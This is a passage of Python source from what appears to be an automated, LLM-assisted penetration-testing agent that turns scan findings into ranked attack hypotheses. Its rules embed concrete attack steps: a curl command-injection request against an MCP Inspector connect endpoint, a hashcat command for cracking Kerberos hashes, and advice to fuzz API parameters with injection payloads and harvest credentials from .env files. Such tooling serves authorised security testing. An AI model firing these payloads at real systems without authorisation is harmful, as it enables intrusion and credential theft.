                    break  # One hypothesis per product

        # Web response codes
        if "401" in findings_text:
            hypotheses.append(
                AttackHypothesis(
                    description="Authentication bypass attempt (401 response)",
                    confidence=0.5,
                    source=HypothesisSource.PATTERN,
                    expected_outcome="authenticated access without credentials",
                )
            )

        if "403" in findings_text and "forbidden" in findings_text.lower():
            hypotheses.append(
                AttackHypothesis(
                    description="WAF bypass / path traversal (403 response)",
                    confidence=0.4,
                    source=HypothesisSource.PATTERN,
                    expected_outcome="bypassed access restriction",
                )
            )

        # Kerberos hash detection
        if "krb5asrep" in findings_text.lower() or "krb5tgs" in findings_text.lower():
            hypotheses.append(
                AttackHypothesis(
                    description="Kerberos hash cracking (hashcat/john)",
                    confidence=0.8,
                    source=HypothesisSource.PATTERN,
                    expected_outcome="plaintext credential",
                    verification_method="hashcat -m 18200 hash.txt wordlist.txt",
                )
            )

        # Environment variable / credential file detection
        if ".env" in findings_text or "DATABASE_URL" in findings_text:
            hypotheses.append(
                AttackHypothesis(
                    description="Credential extraction from environment/config files",
                    confidence=0.8,
                    source=HypothesisSource.PATTERN,
                    expected_outcome="database or service credentials",
                )
            )

        # MSSQL specific
        if "execute as" in findings_text.lower():
            hypotheses.append(
                AttackHypothesis(
                    description="MSSQL EXECUTE AS privilege escalation",
                    confidence=0.8,
                    source=HypothesisSource.PATTERN,
                    expected_outcome="elevated SQL server privileges",
                )
            )

        # API endpoint discovery → parameter fuzzing hypothesis
        api_indicators = ["/api/", "swagger", "openapi", "graphql"]
        if any(ind in findings_text.lower() for ind in api_indicators):
            hypotheses.append(
                AttackHypothesis(
                    description=(
                        "API endpoint discovered — download JS bundles, extract "
                        "endpoints with curl, analyze parameter structure, and fuzz "
                        "with command injection payloads (command, cmd, exec, args, "
                        "shell, serverConfig, config)"
                    ),
                    confidence=0.7,
                    source=HypothesisSource.PATTERN,
                    expected_outcome="API parameter injection or information disclosure",
                    reasoning=(
                        "Web APIs often accept JSON bodies with dangerous parameter "
                        "names (command, exec, args) that pass user input to "
                        "child_process.spawn() or similar. SvelteKit/Next.js apps "
                        "bundle API routes in JS files that reveal parameter schemas."
                    ),
                )
            )

        # MCP/Model Context Protocol server → command injection
        mcp_indicators = ["mcp", "model context protocol", "/api/mcp/"]
        if any(ind in findings_text.lower() for ind in mcp_indicators):
            hypotheses.append(
                AttackHypothesis(
                    description=(
                        "MCP server detected — test /api/mcp/connect with "
                        "serverConfig.command injection (child_process.spawn). "
                        "POST JSON: {\"serverConfig\": {\"command\": \"id\", "
                        "\"args\": []}}"
                    ),
                    confidence=0.8,
                    source=HypothesisSource.PATTERN,
                    expected_outcome="command execution via serverConfig.command",
                    verification_method=(
                        'curl -X POST -H "Content-Type: application/json" '
                        '-d \'{"serverConfig":{"command":"id","args":[]}}\' '
                        "https://{target}/api/mcp/connect"
                    ),
                    reasoning=(
                        "MCP Inspector passes serverConfig.command directly to "
                        "child_process.spawn() without sanitization. This is a "
                        "known unauthenticated RCE pattern."
                    ),
                )
            )

        # child_process / spawn detection in JS output
        child_proc_indicators = ["child_process", "spawn(", "execSync(", "exec("]
        if any(ind in findings_text for ind in child_proc_indicators):
            hypotheses.append(
                AttackHypothesis(
                    description=(
                        "child_process usage detected in JS — trace which API "
                        "endpoint passes user input to spawn/exec and craft "
                        "command injection payload"
                    ),
                    confidence=0.8,
                    source=HypothesisSource.PATTERN,
                    expected_outcome="remote command execution",
                    reasoning=(
                        "JavaScript using child_process with user-controlled "
                        "parameters is a direct command injection vector."
                    ),
                )
            )

        # Error message analysis → API schema inference
        error_indicators = [
            "unknown mcp server",
            "invalid server",
            "missing required",
            "validation error",
            "expected",
        ]
        if any(ind in findings_text.lower() for ind in error_indicators):
            hypotheses.append(
                AttackHypothesis(
                    description=(
                        "API error message reveals parameter structure — analyze "
                        "error response to infer required fields and retry with "
                        "corrected parameters"
                    ),
                    confidence=0.6,
                    source=HypothesisSource.PATTERN,
                    expected_outcome="valid API request construction",
                    reasoning=(
                        "API error messages often leak parameter names, types, "
                        "and validation rules. Use these to construct valid "
                        "injection payloads."
                    ),
                )
            )

        return hypotheses

    # ------------------------------------------------------------------
    # Layer 3: RAG — similar attack pattern search
    # ------------------------------------------------------------------

    def _generate_rag(
        self, context: dict[str, Any]
    ) -> list[AttackHypothesis]:
        """RAG-based hypothesis generation via hybrid search.

        Searches attack_memory for similar past attacks and optionally
        boosts results using strategy_memory success patterns.
        """
        if not self._attack_memory or not getattr(self._attack_memory, "is_available", False):
            return []

        query = self._build_rag_query(context)
        if not query:
            return []

        try:
            results = self._attack_memory.search_hybrid(query, top_k=3)
        except Exception:
            logger.warning("RAG search failed", exc_info=True)
            return []

        hypotheses: list[AttackHypothesis] = []

        # Strategy boost: incorporate high-success-rate strategies
        if self._strategy_memory and getattr(self._strategy_memory, "is_available", False):
            try:
                target_type = context.get("phase", "general")
                boosts = self._strategy_memory.get_strategy_boost(query, target_type)
                for b in boosts[:2]:
                    tool_seq = b.get("tool_sequence", [])
                    name = b.get("name", "strategy")
                    rate = b.get("success_rate", 0.5)
                    hypotheses.append(AttackHypothesis(
                        description=f"Strategy: {name}",
                        reasoning=f"RAG strategy (tools: {', '.join(tool_seq[:3])}, "
                                  f"success_rate: {rate:.0%})",
                        confidence=_clamp_confidence(_clamp_confidence(rate) * 0.8, max_cap=0.7),
                        source=HypothesisSource.RAG,
                    ))
            except Exception:
                logger.warning("Strategy boost failed", exc_info=True)

        # Convert attack search results to hypotheses
        for r in results:
            tags = r.get("tags", []) or ["unknown"]
            scenario = r.get("scenario", "unknown")
            score = r.get("rrf_score", 0.5)
            tools = r.get("tools_used", [])
            cves = r.get("cve_exploited", [])
            result = r.get("result", "")
            steps = r.get("steps", [])

            # Build informative reasoning from all available fields
            reasoning_parts = [f"tags: {', '.join(tags[:10])}"]
            if tools:
                reasoning_parts.append(f"tools: {', '.join(tools[:5])}")
            if cves:
                reasoning_parts.append(f"CVE: {', '.join(cves[:3])}")
            if result:
                reasoning_parts.append(f"result: {result[:100]}")

            # Include first step in description for actionable context
            desc = f"Similar attack: {scenario[:80]}"
            if steps and isinstance(steps, list) and steps[0]:
                desc += f" → {steps[0][:60]}"

            hypotheses.append(AttackHypothesis(
                description=desc[:200],
                reasoning=f"RAG match ({'; '.join(reasoning_parts)})",
                confidence=_clamp_confidence(score, max_cap=0.7),
                source=HypothesisSource.RAG,
            ))

        return hypotheses

    @staticmethod
    def _build_rag_query(context: dict[str, Any]) -> str:
        """Build a search query string from hypothesis context."""
        parts: list[str] = []
        if context.get("objective"):
            parts.append(context["objective"])
        if context.get("target"):
            parts.append(context["target"])
        services = context.get("services", [])
        for s in services[:3]:
            if isinstance(s, dict):
                name = s.get("service_name", "")
            else:
                name = getattr(s, "service_name", "")
            if name:
                parts.append(str(name))
        phase = context.get("phase", "")
        if phase:
            parts.append(phase)
        return " ".join(parts)

    # ------------------------------------------------------------------
    # Layer 4: LLM dynamic
    # ------------------------------------------------------------------

    async def generate_hypotheses_async(
        self, context: dict[str, Any]
    ) -> list[AttackHypothesis]:
        """Generate hypotheses including async LLM layer.

        Call this instead of generate_hypotheses() when in async context
        and LLM-generated hypotheses are desired.
        """
        # Get sync hypotheses first
        hypotheses = self.generate_hypotheses(context)

        # Add LLM layer if adapter available and we need more
        if self._adapter and len(hypotheses) < self._max_hypotheses:
            llm_hypotheses = await self._generate_llm(context)
            hypotheses.extend(llm_hypotheses)
            hypotheses.sort(key=lambda h: h.confidence, reverse=True)
            hypotheses = hypotheses[: self._max_hypotheses]

        return hypotheses

    async def _generate_llm(
        self, context: dict[str, Any]
    ) -> list[AttackHypothesis]:
        """LLM-generated hypotheses via BackendAdapter."""
        if not self._adapter:
            return []

        target = context.get("target", "")
        objective = context.get("objective", "")
        phase = context.get("phase", "recon")
        services = [
            str(getattr(s, "service_name", "")) for s in context.get("services", [])
        ]
        findings = context.get("findings", [])

        prompt = HYPOTHESIS_GENERATION_PROMPT.format(
            target=target,
            objective=objective,
            phase=phase,
            services=", ".join(services) or "none",
            findings="\n".join(f[:200] for f in findings[-3:]) or "none",
        )

        try:
            response = await self._adapter.generate(prompt)
            return self._parse_llm_hypotheses(response)
        except Exception:
            logger.warning("LLM hypothesis generation failed, falling back to rule-based")
            return []

    def _parse_llm_hypotheses(self, response: str) -> list[AttackHypothesis]:
        """Parse JSON array of hypotheses from LLM response."""
        # Strategy: try the largest valid JSON array first (outermost brackets).
        # Scan for every '[' and ']', preferring the pair that yields the
        # longest valid JSON array containing dicts.
        items: list[Any] = []
        best_len = 0
        for i, ch in enumerate(response):
            if ch != "[":
                continue
            # For each '[', try pairing with the farthest ']' first
            for j in range(len(response) - 1, i, -1):
                if response[j] != "]":
                    continue
                candidate = response[i : j + 1]
                try:
                    parsed = json.loads(candidate)
                except json.JSONDecodeError:
                    continue
                if isinstance(parsed, list) and len(candidate) > best_len:
                    items = parsed
                    best_len = len(candidate)
                break  # Found best match for this '[', move on
        if not items:
            return []

        hypotheses: list[AttackHypothesis] = []
        for item in items:
            if not isinstance(item, dict):
                continue
            try:
                conf = _clamp_confidence(item.get("confidence", 0.5))
            except (ValueError, TypeError):
                conf = 0.5
            hypotheses.append(
                AttackHypothesis(
                    description=item.get("description", ""),
                    expected_outcome=item.get("expected_outcome", ""),
                    verification_method=item.get("verification_method", ""),
                    confidence=conf,
                    source=HypothesisSource.LLM,
                )
            )
        return hypotheses
